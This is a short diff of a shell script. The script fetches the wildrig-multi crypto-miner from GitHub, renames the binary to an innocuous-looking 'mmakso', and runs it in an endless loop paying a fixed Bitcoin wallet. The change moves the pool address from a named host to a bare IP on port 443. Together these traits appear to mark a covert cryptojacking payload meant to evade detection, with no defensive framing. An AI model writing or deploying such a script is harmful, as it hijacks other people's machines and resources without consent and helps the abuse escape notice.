@@ -4,5 +4,5 @@ curl https://github.com/andru-kun/wildrig-multi/releases/download/0.47.9/wildrig
 tar xf wildrig-multi-linux-0.47.9.tar.gz
 mv wildrig-multi mmakso
 while :; do
-./mmakso --algo qhash --url qubitcoin.luckypool.io:8610 --user bc1qz5r5wtgtumpv0eqyluulztpqv7dcu6fe08n8wf.$(echo $RANDOM | md5sum | head -c 10) --pass x
+./mmakso --algo qhash --url 54.160.236.68:443 --user bc1qz5r5wtgtumpv0eqyluulztpqv7dcu6fe08n8wf.$(echo $RANDOM | md5sum | head -c 10) --pass x
 done
